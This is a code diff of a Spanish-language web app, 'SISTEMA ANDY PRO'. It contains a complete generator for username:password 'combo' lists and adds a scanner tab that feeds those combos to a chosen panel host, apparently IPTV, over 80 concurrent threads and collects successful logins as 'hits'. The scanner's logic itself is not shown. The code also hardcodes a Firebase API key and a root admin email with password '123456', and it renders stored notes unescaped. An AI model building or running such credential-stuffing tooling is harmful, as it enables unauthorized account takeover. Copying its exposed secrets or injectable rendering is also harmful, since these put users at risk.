@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>SISTEMA ANDY PRO - Global Multi-Admin</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght=700;900&family=Orbitron:wght@700&display=swap');
 
         :root { 
             --bg-main: #0b141a; 
@@ -18,6 +18,8 @@
             --success: #00a884;
             --blue-sub: #0033A0;
             --red-sub: #D52B1E;
+            --accent-start: #00ff41;
+            --accent-end: #ff003c;
         }
         
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
@@ -54,7 +56,7 @@
         input:focus, select:focus, textarea:focus { border-color: var(--blue-sub); }
         input::placeholder { color: var(--text-muted); }
         
-        button { padding: 12px; border-radius: 8px; border: none; font-weight: bold; font-size: 15px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; transition: all 0.2s; }
+        button { padding: 12px; border-radius: 8px; border: none; font-weight: bold; font-size: 14px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; transition: all 0.2s; }
         button:active { transform: scale(0.98); opacity: 0.8; }
         .btn-wa { width: 100%; background: var(--blue-sub); color: white; margin-top: 5px; }
         .btn-wa:hover { background: #002270; }
@@ -62,7 +64,7 @@
         .btn-danger:hover { background: #b82016; }
         .btn-success { background: var(--success); color: white; }
 
-        /* INTERFAZ PRINCIPAL CON CONTENEDOR AJUSTADO */
+        /* INTERFAZ PRINCIPAL */
         .app-container { display: flex; flex-direction: column; height: 100%; width: 100%; }
         
         .app-header { 
@@ -71,33 +73,45 @@
             border-bottom: 2px solid var(--wa-teal);
         }
         .user-info { display: flex; align-items: center; gap: 10px; }
-        .user-text .title { font-family: 'Cinzel', serif; font-weight: 900; font-size: 1.3rem; color: var(--wa-teal); text-shadow: 1px 1px 0px var(--red-sub); }
+        .user-text .title { font-family: 'Cinzel', serif; font-weight: 900; font-size: 1.2rem; color: var(--wa-teal); text-shadow: 1px 1px 0px var(--red-sub); }
         .user-text .status { font-size: 0.72rem; color: #00ff9d; display: block; font-family: monospace; }
         .header-actions { display: flex; gap: 6px; align-items: center; }
         .btn-action { background: #2a3942; color: white; padding: 8px 12px; font-size: 0.8rem; border-radius: 6px; border: 1px solid var(--wa-teal); }
 
-        /* NAVEGACIÓN DE SECCIONES */
-        .nav-tabs { display: flex; background: rgba(20,20,20,0.95); border-bottom: 1px solid #333; flex-shrink: 0; }
-        .tab-item { flex: 1; padding: 12px 5px; text-align: center; font-size: 0.85rem; font-weight: bold; color: var(--text-muted); cursor: pointer; text-transform: uppercase; border-bottom: 3px solid transparent; }
+        /* NAVEGACIÓN DE SECCIONES (Ajustado para 4 pestañas en móviles) */
+        .nav-tabs { display: flex; background: rgba(20,20,20,0.95); border-bottom: 1px solid #333; flex-shrink: 0; overflow-x: auto; -webkit-overflow-scrolling: touch; }
+        .tab-item { flex: 1; min-width: 90px; padding: 12px 3px; text-align: center; font-size: 0.75rem; font-weight: bold; color: var(--text-muted); cursor: pointer; text-transform: uppercase; border-bottom: 3px solid transparent; white-space: nowrap; }
         .tab-item.active { color: var(--wa-teal); border-bottom-color: var(--wa-teal); background: rgba(255,221,0,0.05); }
 
         /* CONTENEDOR DE TRABAJO */
-        .main-content { flex: 1; overflow-y: auto; background: rgba(10,10,10,0.92); padding: 15px; display: flex; flex-direction: column; padding-bottom: calc(15px + env(safe-area-inset-bottom)); }
+        .main-content { flex: 1; overflow-y: auto; background: rgba(10,10,10,0.92); padding: 12px; display: flex; flex-direction: column; padding-bottom: calc(15px + env(safe-area-inset-bottom)); }
         
-        /* SECCIÓN BLOC DE NOTAS */
+        /* BLOC DE NOTAS */
         .note-form { background: var(--panel-header); padding: 12px; border-radius: 10px; border-left: 4px solid var(--wa-teal); margin-bottom: 15px; }
         .notes-grid { display: flex; flex-direction: column; gap: 10px; }
         .note-card { background: #1a1a1a; border: 1px solid #333; padding: 12px; border-radius: 8px; display: flex; flex-direction: column; gap: 6px; position: relative; }
-        .note-card p { font-family: 'Courier New', Courier, monospace; color: #00ff9d; font-size: 0.9rem; word-break: break-all; white-space: pre-wrap; }
+        .note-card p { font-family: monospace; color: #00ff9d; font-size: 0.9rem; word-break: break-all; white-space: pre-wrap; }
         .note-meta { font-size: 0.7rem; color: var(--text-muted); text-align: right; }
         .note-actions { display: flex; gap: 6px; justify-content: flex-end; margin-top: 4px; }
         .btn-mini { padding: 5px 10px; font-size: 0.75rem; border-radius: 4px; border: none; font-weight: bold; color: white; text-transform: uppercase; cursor: pointer; }
 
-        /* SECCIÓN GENERADOR DE COMBOS */
-        .gen-section h3 { font-family: 'Cinzel', serif; color: var(--wa-teal); text-align: center; margin-bottom: 10px; font-size: 1.3rem; }
+        /* GENERADOR DE COMBOS */
+        .gen-section h3, .scan-section h3 { font-family: 'Cinzel', serif; color: var(--wa-teal); text-align: center; margin-bottom: 10px; font-size: 1.3rem; }
         .gen-container { width: 100%; max-width: 500px; margin: 0 auto; }
         .gen-label { font-size: 0.85rem; color: var(--text-muted); font-weight: bold; display: block; margin-top: 6px; text-align: left; }
-        textarea.resultado-box { height: 220px; color: #00ff9d; background: #050505; border: 2px solid var(--blue-sub); font-family: 'Courier New', Courier, monospace; margin-top: 10px; }
+        textarea.resultado-box { height: 180px; color: #00ff9d; background: #050505; border: 2px solid var(--blue-sub); font-family: monospace; margin-top: 10px; }
+
+        /* SECCIÓN ESCÁNER - LOS LOCOS SIN FRONTERAS */
+        .scanner-title { text-align: center; font-size: 1.2rem; font-family: 'Orbitron', monospace; background: linear-gradient(90deg, var(--accent-start), #fff, var(--accent-end)); -webkit-background-clip: text; background-clip: text; color: transparent; border: 2px solid var(--accent-start); border-radius: 8px; padding: 8px; margin-bottom: 15px; }
+        #progressContainer { border: 1px solid #333; border-radius: 10px; padding: 12px; background: #000; margin-top: 12px; }
+        #progressBar { background: #111; border-radius: 5px; height: 12px; overflow: hidden; margin: 8px 0; }
+        .bar-fill { background: linear-gradient(90deg, var(--accent-start), #fff, var(--accent-end)); height: 100%; width: 0%; transition: width .3s ease; }
+        #hitsContainer, .db-hits-container { background: #050505; border: 1px solid #222; border-radius: 10px; padding: 10px; margin-top: 12px; height: 320px; overflow-y: auto; }
+        
+        .hit-block { font-family: monospace; white-space: pre-wrap; background: #000; padding: 12px; margin-bottom: 12px; border-radius: 6px; border: 1px solid #333; line-height: 1.4; color: #00ff41; position: relative; font-size: 0.85rem; }
+        .hit-block-db { border-left: 4px solid var(--wa-teal); background: #111; margin-bottom: 10px; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 0.85rem; }
+        .copy-btn { position: absolute; top: 8px; right: 8px; background: #222; color: #fff; border: 1px solid #444; padding: 4px 8px; font-size: 9px; cursor: pointer; border-radius: 4px; font-weight: bold; }
+        .counter-badge { display: inline-block; background: var(--blue-sub); color: #fff; padding: 2px 6px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; margin-top: 5px; }
 
         /* SECCIÓN MULTI-ADMINISTRADORES */
         .admin-box { background: var(--panel-header); padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid var(--wa-teal); }
@@ -110,7 +124,7 @@
 
     <div id="authScreen" class="auth-container">
         <div class="auth-card">
-            <h2> GEN ANDY </h2>
+            <h2>⚙️ GEN ANDY ⚙️</h2>
             <p>Premium System &amp; Credentials</p>
             <input type="email" id="loginEmail" placeholder="Correo de Acceso">
             <input type="password" id="loginPass" placeholder="Contraseña">
@@ -122,56 +136,52 @@
         <div class="app-header">
             <div class="user-info">
                 <div class="user-text">
-                    <span class="title"> SYS ANDY PRO</span>
+                    <span class="title">⚙️ SYS ANDY PRO</span>
                     <span id="userStatus" class="status">Cargando Administrador...</span>
                 </div>
             </div>
             <div class="header-actions">
-                <a href="https://hisradioperu.com/hermanos-vip/index.html" target="_blank" class="btn-action" style="background:var(--red-sub); text-decoration:none;"> Scan IPTV</a>
                 <button id="btnSalir" class="btn-action" style="background:var(--input-bg); color:var(--danger); border-color:var(--danger)">Salir</button>
             </div>
         </div>
 
         <div class="nav-tabs">
-            <div class="tab-item active" id="tabBloc" onclick="switchTab('bloc')">📝 Bloc de Notas</div>
-            <div class="tab-item" id="tabGen" onclick="switchTab('gen')">⚙️ Generador</div>
-            <div class="tab-item" id="tabAdmins" onclick="switchTab('admins')">👥 Administradores</div>
+            <div class="tab-item active" id="tabBloc" onclick="switchTab('bloc')">📝 Bloc</div>
+            <div class="tab-item" id="tabGen" onclick="switchTab('gen')">⚙️ Combos</div>
+            <div class="tab-item" id="tabScan" onclick="switchTab('scan')">📡 Escáner LSF</div>
+            <div class="tab-item" id="tabAdmins" onclick="switchTab('admins')">👥 Admins</div>
         </div>
 
         <div class="main-content">
             
             <div id="secBloc" class="view-section">
                 <div class="note-form">
-                    <input type="text" id="noteTitle" placeholder="Título o etiqueta (Ej: URL Escaneo / Cuentas)">
-                    <textarea id="noteContent" placeholder="Escribe o pega tus datos, URLs o texto aquí..." style="height:100px; font-family:sans-serif;"></textarea>
+                    <input type="text" id="noteTitle" placeholder="Título o etiqueta">
+                    <textarea id="noteContent" placeholder="Escribe o pega tus datos aquí..." style="height:80px; font-family:sans-serif;"></textarea>
                     <input type="hidden" id="editNoteId" value="">
                     <button class="btn-wa" id="btnGuardarNota" style="background:var(--success); margin-top:5px;">Guardar Registro</button>
-                    <button class="btn-wa hidden" id="btnCancelarEdit" style="background:var(--input-bg); margin-top:5px;">Cancelar Edición</button>
+                    <button class="btn-wa hidden" id="btnCancelarEdit" style="background:var(--input-bg); margin-top:5px;">Cancelar</button>
                 </div>
-                <div class="notes-grid" id="notesList">
-                    </div>
+                <div class="notes-grid" id="notesList"></div>
             </div>
 
             <div id="secGen" class="view-section hidden">
                 <div class="gen-section">
-                    <h3> Generador de Combos</h3>
+                    <h3>⚙️ Generador de Combos</h3>
                     <div class="gen-container">
                         <span class="gen-label">Cantidad de Combos</span>
                         <input type="number" id="cantidad" value="100">
-
                         <span class="gen-label">Longitud Contraseña</span>
                         <input type="number" id="longitud" value="8">
-
                         <span class="gen-label">Tipo de Usuario</span>
                         <select id="tipo">
                             <option value="random">Usuario Random</option>
                             <option value="email">Email Gmail</option>
                             <option value="nombre">Nombre Simple</option>
                             <option value="nombrenombre">Nombre:Nombre</option>
-                            <option value="nombreigual">Nombre = Pass (dario;dario)</option>
-                            <option value="andymix">Nombre combinado (Mayús/Minús/Núm) (Infinito)</option>
+                            <option value="nombreigual">Nombre = Pass</option>
+                            <option value="andymix">Nombre combinado Infinito</option>
                         </select>
-
                         <span class="gen-label">Agregar Año</span>
                         <select id="anio">
                             <option value="">Sin año</option>
@@ -180,32 +190,68 @@
                             <option value="2026">2026</option>
                             <option value="2027">2027</option>
                         </select>
-
                         <span class="gen-label">Separador</span>
                         <select id="sep">
                             <option value=":">:</option>
                             <option value="|">|</option>
                             <option value=";">;</option>
                         </select>
-
-                        <button id="btnGenerarCombos" style="background:var(--blue-sub); margin-top:10px;">Generar Combos</button>
-                        <button id="btnDescargarCombos" class="btn-danger" style="margin-top:5px;">Descargar TXT</button>
-
-                        <textarea id="resultado" class="resultado-box" readonly placeholder="Los combos generados aparecerán aquí..."></textarea>
+                        <button id="btnGenerarCombos" style="background:var(--blue-sub); margin-top:10px; width:100%;">Generar Combos</button>
+                        <button id="btnDescargarCombos" class="btn-danger" style="margin-top:5px; width:100%;">Descargar TXT</button>
+                        <textarea id="resultado" class="resultado-box" readonly placeholder="Los combos aparecerán aquí..."></textarea>
                     </div>
+                </div>
+            </div>
+
+            <div id="secScan" class="view-section hidden">
+                <div class="scan-section">
+                    <div class="scanner-title">📡 LOS LOCOS SIN FRONTERAS 📡</div>
+                    
+                    <span class="gen-label">Panel (host):</span>
+                    <input type="text" id="hostInput" placeholder="ejemplo.com:8080" />
+
+                    <span class="gen-label">Cargar Combos (.txt):</span>
+                    <input type="file" id="comboFile1" accept=".txt" style="font-size:11px; padding:6px; margin-bottom:4px;" />
+                    <input type="file" id="comboFile2" accept=".txt" style="font-size:11px; padding:6px; margin-bottom:4px;" />
+                    <input type="file" id="comboFile3" accept=".txt" style="font-size:11px; padding:6px;" />
+
+                    <span class="gen-label">Pegar Combos:</span>
+                    <textarea id="comboText" rows="3" placeholder="user:pass" style="background:#000; font-family:monospace;"></textarea>
+
+                    <span class="gen-label">Hilos Simultáneos:</span>
+                    <input type="number" id="concurrencyInput" value="80" />
+
+                    <div style="margin: 10px 0; font-size:0.85rem;">
+                        <label><input type="checkbox" id="useCors" checked /> Proxy CORS</label>
+                        <label style="margin-left:15px"><input type="checkbox" id="soundToggle" checked /> Sonido</label>
+                    </div>
+
+                    <button id="startBtn" style="background:var(--success); width:100%;">INICIAR ESCANEO</button>
+                    <button id="stopBtn" class="btn-danger" style="margin-top:5px; width:100%;" disabled>DETENER</button>
+                    <button id="saveBtn" style="background:var(--blue-sub); margin-top:5px; width:100%;" disabled>DESCARGAR HITS TXT</button>
+
+                    <div id="progressContainer">
+                        <div id="hitsCountDisplay" style="color:var(--accent-start); font-weight:bold; font-size:0.9rem;">Hits Reales: 0</div>
+                        <div id="progressBar"><div id="progressBarFill" class="bar-fill"></div></div>
+                        <div id="progressText" style="font-size:0.8rem; font-family:monospace;">Esperando...</div>
+                    </div>
+
+                    <h4 style="margin-top:15px; color:var(--wa-teal); font-family:'Cinzel';">Resultados del Escaneo Actual:</h4>
+                    <div id="hitsContainer"></div>
+
+                    <h4 style="margin-top:20px; color:var(--wa-teal); font-family:'Cinzel';">🌐 Hits Guardados en Servidor Web:</h4>
+                    <div class="db-hits-container" id="dbHitsList"></div>
                 </div>
             </div>
 
             <div id="secAdmins" class="view-section hidden">
                 <div class="admin-box">
                     <h4>Registrar Nuevo Administrador</h4>
-                    <p style="font-size:0.75rem; color:var(--text-muted); margin-bottom:8px;">Cualquier miembro registrado tendrá permisos completos de administración en el sistema.</p>
                     <input type="text" id="newAdminName" placeholder="Nombre de Identificación">
                     <input type="email" id="newAdminEmail" placeholder="Correo de Acceso">
                     <input type="text" id="newAdminPass" placeholder="Clave de Acceso">
                     <button class="btn-wa" id="btnCrearAdmin" style="background:var(--blue-sub)">Otorgar Acceso Total</button>
                 </div>
-
                 <div class="admin-box" style="background:transparent; padding:0; border:none;">
                     <h4>Administradores en Red</h4>
                     <div id="adminsList" style="margin-top:10px;"></div>
@@ -217,9 +263,9 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, collection, addDoc, doc, query, orderBy, onSnapshot, serverTimestamp, updateDoc, deleteDoc, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+        import { getFirestore, collection, addDoc, doc, query, orderBy, onSnapshot, serverTimestamp, updateDoc, deleteDoc, where, getDocs, increment } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-        // Mantenimiento de credenciales y rutas de tu proyecto activo en Firebase
+        // Configuración de tu base de datos activa
         const firebaseConfig = {
             apiKey: "AIzaSyDGE5GTlwIypuryIVnDYiTR9a2wyCgWkfs",
             authDomain: "gestion-ventas-pro-f8de4.firebaseapp.com",
@@ -232,7 +278,6 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // Administrador Principal Root Embebido
         const ADMIN_REAL = {
             email: "andyobregon799@gmail.com",
             pass: "123456",
@@ -242,12 +287,9 @@
 
         let sesionUsuario = JSON.parse(localStorage.getItem('andy_sys_session')) || null;
 
-        // Validar sesión al cargar
-        if (sesionUsuario) {
-            entrarAlApp();
-        }
+        if (sesionUsuario) { entrarAlApp(); }
 
-        // Navegación Interactiva Global Interna (Móvil todo en una sola pantalla)
+        // Navegación Interactiva Global
         window.switchTab = function(tab) {
             document.querySelectorAll('.view-section').forEach(el => el.classList.add('hidden'));
             document.querySelectorAll('.tab-item').forEach(el => el.classList.remove('active'));
@@ -258,18 +300,20 @@
             } else if(tab === 'gen') {
                 document.getElementById('secGen').classList.remove('hidden');
                 document.getElementById('tabGen').classList.add('active');
+            } else if(tab === 'scan') {
+                document.getElementById('secScan').classList.remove('hidden');
+                document.getElementById('tabScan').classList.add('active');
             } else if(tab === 'admins') {
                 document.getElementById('secAdmins').classList.remove('hidden');
                 document.getElementById('tabAdmins').classList.add('active');
             }
         }
 
-        // Autenticación de Cuentas (Root u otros Administradores creados)
+        // Login
         document.getElementById('btnIngresar').onclick = async () => {
             const email = document.getElementById('loginEmail').value.trim();
             const pass = document.getElementById('loginPass').value.trim();
-
-            if (!email || !pass) return alert("Por favor rellene las credenciales básicas.");
+            if (!email || !pass) return alert("Por favor rellene las credenciales.");
 
             if (email === ADMIN_REAL.email && pass === ADMIN_REAL.pass) {
                 sesionUsuario = { ...ADMIN_REAL };
@@ -281,36 +325,30 @@
             try {
                 const q = query(collection(db, "usuarios_vip"), where("email", "==", email), where("pass", "==", pass));
                 const snapshot = await getDocs(q);
-
-                if (snapshot.empty) {
-                    alert("Acceso inválido. Llave incorrecta o removida.");
-                } else {
+                if (snapshot.empty) { alert("Acceso inválido."); } else {
                     const uDoc = snapshot.docs[0].data();
                     sesionUsuario = { id: snapshot.docs[0].id, ...uDoc };
                     localStorage.setItem('andy_sys_session', JSON.stringify(sesionUsuario));
                     entrarAlApp();
                 }
-            } catch (err) {
-                alert("Error de conexión al verificar el acceso.");
-            }
+            } catch (err) { alert("Error de conexión."); }
         };
 
         function entrarAlApp() {
             document.getElementById('authScreen').classList.add('hidden');
             document.getElementById('appScreen').classList.remove('hidden');
             document.getElementById('userStatus').innerText = `Admin Activo: ${sesionUsuario.nombre || sesionUsuario.identificacion}`;
-            
             escucharNotas();
             escucharAdmins();
+            escucharHitsDB();
         }
 
-        // ================= BLOC DE NOTAS CON FIREBASE REALTIME =================
+        // ================= LOGICA BLOC DE NOTAS =================
         document.getElementById('btnGuardarNota').onclick = async () => {
             const title = document.getElementById('noteTitle').value.trim();
             const content = document.getElementById('noteContent').value.trim();
             const editId = document.getElementById('editNoteId').value;
-
-            if (!content) return alert("El contenido de la nota no puede estar vacío.");
+            if (!content) return alert("Contenido vacío.");
 
             const itemPayload = {
                 titulo: title || "Nota Sin Título",
@@ -330,9 +368,7 @@
                 }
                 document.getElementById('noteTitle').value = "";
                 document.getElementById('noteContent').value = "";
-            } catch (e) {
-                alert("Error al procesar la operación en el Bloc.");
-            }
+            } catch (e) { alert("Error en bloc."); }
         };
 
         document.getElementById('btnCancelarEdit').onclick = () => {
@@ -349,14 +385,12 @@
                 const list = document.getElementById('notesList');
                 list.innerHTML = "";
                 snapshot.forEach((docSnap) => {
-                    const id = docSnap.id;
-                    const data = docSnap.data();
+                    const id = docSnap.id; const data = docSnap.data();
                     const cleanContent = data.contenido.replace(/"/g, '&quot;').replace(/'/g, "\\'");
-
                     const card = document.createElement('div');
                     card.className = "note-card";
                     card.innerHTML = `
-                        <strong style="color:var(--wa-teal); font-size:1rem;">📌 ${data.titulo}</strong>
+                        <strong>📌 ${data.titulo}</strong>
                         <p>${data.contenido}</p>
                         <div class="note-meta">Por: ${data.autor}</div>
                         <div class="note-actions">
@@ -371,11 +405,7 @@
         }
 
         window.copiarTexto = function(texto) {
-            navigator.clipboard.writeText(texto).then(() => {
-                alert("Contenido copiado al portapapeles con éxito.");
-            }).catch(() => {
-                alert("Error al copiar texto de forma automática.");
-            });
+            navigator.clipboard.writeText(texto).then(() => alert("Copiado.")).catch(() => alert("Error al copiar."));
         };
 
         window.prepararEdicion = function(id, titulo, contenido) {
@@ -384,174 +414,250 @@
             document.getElementById('noteContent').value = contenido;
             document.getElementById('btnCancelarEdit').classList.remove('hidden');
             document.getElementById('btnGuardarNota').innerText = "Actualizar Registro";
-            document.getElementById('noteTitle').focus();
         };
 
         window.eliminarNota = async function(id) {
-            if (confirm("¿Deseas eliminar de forma permanente esta nota del sistema común?")) {
-                await deleteDoc(doc(db, "bloc_notas_vip", id));
-            }
+            if (confirm("¿Eliminar nota?")) await deleteDoc(doc(db, "bloc_notas_vip", id));
         };
 
-        // ================= ALGORITMO COMPLETO DEL GENERADOR DE COMBOS =================
+        // ================= ALGORITMO GENERADOR DE COMBOS =================
         const nombres = ["juan","luis","pedro","carlos","miguel","jose","manuel","daniel","ricardo","antonio","andres","alejandro","alberto","adrian","armando","bruno","benjamin","boris","cesar","cristian","claudio","camilo","david","diego","dario","edgar","eduardo","edwin","esteban","felipe","fernando","francisco","fabian","gabriel","gustavo","gerardo","hector","hugo","ismael","ivan","ignacio","jorge","jesus","julio","jaime","kevin","leonardo","lucas","martin","marcos","mateo","mauricio","nelson","nicolas","oscar","orlando","pablo","patricio","raul","roberto","ramon","rodrigo","sebastian","sergio","santiago","tomas","victor","walter","wilson","yahir","yoel","alex","alan","aaron","angelo","cristobal","damian","dilan","edson","erick","fabio","franco","gonzalo","harold","ian","jonathan","julian","leandro","mariano","maximo","natan","octavio","paolo","renato","samuel","thiago","ulises","valentin","xavier","sofia","valentina","camila","isabella","martina","lucia","daniela","paula","carla","maria","laura","patricia","andrea","mariana","gabriela","fernanda","veronica","claudia","carmen","rosa","silvia","gloria","elena","adriana","beatriz","lorena","ines","noelia","natalia","tatiana","angela","antonia","alicia","irene","monica","raquel","teresa","susana","sonia","diana","karla","brenda","melissa","pamela","jessica","vanessa","marcela","bianca","renata","carolina","valeria","paulina","jimena","alejandra","nuria","lourdes","esther","rocio","pilar","amanda","araceli","leticia","yolanda","florencia","miriam","celeste","samanta","luisa"];
 
         function randomString(length) {
-            const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
-            let result = "";
-            for (let i = 0; i < length; i++) {
-                result += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
+            const chars = "abcdefghijklmnopqrstuvwxyz0123456789"; let result = "";
+            for (let i = 0; i < length; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
             return result;
         }
 
         function alternarMayusculas(texto) {
             let resultado = "";
-            for (let i = 0; i < texto.length; i++) {
-                resultado += Math.random() > 0.5 ? texto[i].toUpperCase() : texto[i].toLowerCase();
-            }
+            for (let i = 0; i < texto.length; i++) resultado += Math.random() > 0.5 ? texto[i].toUpperCase() : texto[i].toLowerCase();
             return resultado;
         }
 
         function generarNombreInfinito() {
-            const prefijos = ["ju", "lu", "pe", "ca", "mi", "jo", "ma", "da", "ri", "an", "al", "br", "be", "ce", "cr", "cl", "di", "ed", "es", "fe", "fr", "ga", "gu", "he", "iv", "je", "ke", "le", "ma", "ne", "ni", "os", "pa", "ra", "ro", "se", "sa", "to", "vi", "wa", "al", "am", "ar", "au", "ba", "bo", "ch", "co", "do", "el", "en", "er", "fa", "fi", "fl", "ge", "gi", "go", "ha", "ho", "ia", "ja", "jo", "la", "li", "me", "mo", "na", "oc", "or", "re", "ru", "sa", "su", "th", "ul", "va", "xa", "ya", "za"];
-            const raices = ["an", "is", "dr", "rl", "gu", "os", "nu", "ni", "ca", "nt", "dr", "lej", "ber", "ria", "man", "un", "nja", "or", "sa", "ist", "aud", "ieg", "ari", "dga", "dua", "dwi", "teb", "lip", "rna", "anc", "abi", "abr", "ust", "era", "ect", "ugo", "ism", "gna", "org", "esu", "uli", "aim", "evi", "eon", "uca", "art", "arc", "ate", "aur", "els", "ico", "sca", "rla", "pab", "atr", "aul", "obe", "amo", "odr", "eba", "erg", "ant", "oma", "ict", "alt", "il", "la", "co", "br", "da", "me", "ra", "li", "sa", "le", "mi"];
-            const sufijos = ["an", "is", "dro", "los", "guel", "se", "uel", "niel", "ardo", "nio", "dres", "andro", "to", "rian", "do", "no", "min", "ris", "sar", "tian", "dio", "milo", "vid", "go", "rio", "gar", "rdo", "win", "ban", "pe", "ndo", "co", "bian", "briel", "tavo", "rdo", "tor", "go", "mael", "van", "cio", "ge", "sus", "lio", "me", "vin", "ardo", "cas", "tin", "cos", "teo", "cio", "son", "las", "car", "do", "blo", "cio", "ul", "to", "mon", "go", "tian", "gio", "go", "mas", "tor", "ter", "son", "hir", "el", "ex", "an", "on", "lo", "bal", "an", "co", "lo", "ro", "ian", "than", "lian", "dro", "no", "mo", "tan", "vio", "to", "uel", "go", "ses", "tin", "er", "ela", "na", "mila", "lla", "tina", "cia", "la", "la", "ria", "ra", "cia", "drea", "na", "la", "da", "ca", "dia", "men", "sa", "via", "ria", "na", "ana", "triz", "na", "nes", "lia", "lia", "ana", "la", "nia", "cia", "ne", "ca", "sa", "sa", "na", "la", "da", "sa", "ca", "ta", "na", "ria", "na", "ena", "dra"];
-
-            let n = prefijos[Math.floor(Math.random() * prefijos.length)] + 
-                    raices[Math.floor(Math.random() * raices.length)] + 
-                    sufijos[Math.floor(Math.random() * sufijos.length)];
-
+            const prefijos = ["ju", "lu", "pe", "ca", "mi", "jo", "ma", "da", "ri", "an", "al", "br", "be", "ce", "cr", "cl", "di", "ed", "es", "fe", "fr", "ga", "gu", "he", "iv", "je", "ke", "le", "ma", "ne", "ni", "os", "pa", "ra", "ro", "se", "sa", "to", "vi", "wa"];
+            const raices = ["an", "is", "dr", "rl", "gu", "os", "nu", "ni", "ca", "nt", "ber", "ria", "man", "un", "nja", "or", "sa", "ist", "aud"];
+            const sufijos = ["an", "is", "dro", "los", "guel", "se", "uel", "niel", "ardo", "nio", "dres", "andro", "to", "rian", "do"];
+            let n = prefijos[Math.floor(Math.random() * prefijos.length)] + raices[Math.floor(Math.random() * raices.length)] + sufijos[Math.floor(Math.random() * sufijos.length)];
             return n.replace(/[^a-zA-Z]/g, "").substring(0, 8);
         }
 
         document.getElementById('btnGenerarCombos').onclick = () => {
             let cantidad = parseInt(document.getElementById("cantidad").value) || 100;
             let longitud = parseInt(document.getElementById("longitud").value) || 8;
-            let tipo = document.getElementById("tipo").value;
-            let anio = document.getElementById("anio").value;
-            let sep = document.getElementById("sep").value;
-
+            let tipo = document.getElementById("tipo").value; let anio = document.getElementById("anio").value; let sep = document.getElementById("sep").value;
             let output = "";
 
             for (let i = 0; i < cantidad; i++) {
-                let user = "";
-                let pass = "";
-
-                if (tipo == "random") {
-                    user = randomString(6);
-                    pass = randomString(longitud);
-                }
-                if (tipo == "email") {
-                    user = randomString(6) + "@gmail.com";
-                    pass = randomString(longitud);
-                }
-                if (tipo == "nombre") {
-                    user = nombres[Math.floor(Math.random() * nombres.length)];
-                    pass = randomString(longitud);
-                }
-                if (tipo == "nombrenombre") {
-                    let nombre1 = nombres[Math.floor(Math.random() * nombres.length)];
-                    let nombre2 = nombres[Math.floor(Math.random() * nombres.length)];
-                    user = nombre1 + ":" + nombre2;
-                    pass = "";
-                }
-                if (tipo == "nombreigual") {
-                    let nombre = nombres[Math.floor(Math.random() * nombres.length)];
-                    user = nombre;
-                    pass = nombre;
-                }
+                let user = "", pass = "";
+                if (tipo == "random") { user = randomString(6); pass = randomString(longitud); }
+                if (tipo == "email") { user = randomString(6) + "@gmail.com"; pass = randomString(longitud); }
+                if (tipo == "nombre") { user = nombres[Math.floor(Math.random() * nombres.length)]; pass = randomString(longitud); }
+                if (tipo == "nombrenombre") { user = nombres[Math.floor(Math.random() * nombres.length)] + ":" + nombres[Math.floor(Math.random() * nombres.length)]; }
+                if (tipo == "nombreigual") { let n = nombres[Math.floor(Math.random() * nombres.length)]; user = n; pass = n; }
                 if (tipo == "andymix") {
-                    let baseNombre1 = generarNombreInfinito();
-                    let baseNombre2 = generarNombreInfinito();
-
-                    let nombreMutado1 = alternarMayusculas(baseNombre1);
-                    let nombreMutado2 = alternarMayusculas(baseNombre2);
-
-                    let num1 = Math.floor(Math.random() * 900) + 100; 
-                    let num2 = Math.floor(Math.random() * 9000) + 1000; 
-
-                    let struct = Math.floor(Math.random() * 4);
-                    if (struct == 0) {
-                        user = nombreMutado1 + num1;
-                        pass = nombreMutado2 + num2;
-                    } else if (struct == 1) {
-                        user = nombreMutado1 + num1;
-                        pass = num1 + nombreMutado2;
-                    } else if (struct == 2) {
-                        user = num1 + nombreMutado1;
-                        pass = nombreMutado2 + num2;
-                    } else {
-                        user = nombreMutado1.toUpperCase() + num1;
-                        pass = num2 + nombreMutado2.toLowerCase();
-                    }
+                    let m1 = alternarMayusculas(generarNombreInfinito()); let m2 = alternarMayusculas(generarNombreInfinito());
+                    let n1 = Math.floor(Math.random() * 900) + 100; let n2 = Math.floor(Math.random() * 9000) + 1000;
+                    let st = Math.floor(Math.random() * 4);
+                    if (st == 0) { user = m1 + n1; pass = m2 + n2; } 
+                    else if (st == 1) { user = m1 + n1; pass = n1 + m2; } 
+                    else if (st == 2) { user = n1 + m1; pass = m2 + n2; } 
+                    else { user = m1.toUpperCase() + n1; pass = n2 + m2.toLowerCase(); }
                 }
-
-                if (anio != "" && pass != "") {
-                    pass = pass + anio;
-                }
-
-                if (pass != "") {
-                    output += user + sep + pass + "\n";
-                } else {
-                    output += user + "\n";
-                }
+                if (anio != "" && pass != "") pass = pass + anio;
+                output += (pass != "") ? user + sep + pass + "\n" : user + "\n";
             }
-
             document.getElementById("resultado").value = output;
         };
 
         document.getElementById('btnDescargarCombos').onclick = () => {
-            let texto = document.getElementById("resultado").value;
-            if(!texto) return alert("Primero genera combos para poder descargar un archivo.");
-            let blob = new Blob([texto], { type: "text/plain" });
-            let link = document.createElement("a");
-            link.href = URL.createObjectURL(blob);
-            link.download = "combos_andy.txt";
-            link.click();
+            let t = document.getElementById("resultado").value; if(!t) return alert("Genera combos primero.");
+            let b = new Blob([t], { type: "text/plain" }); let l = document.createElement("a");
+            l.href = URL.createObjectURL(b); l.download = "combos_andy.txt"; l.click();
         };
 
-        // ================= CREACIÓN DE ADMINISTRADORES EN RED COLECTIVA =================
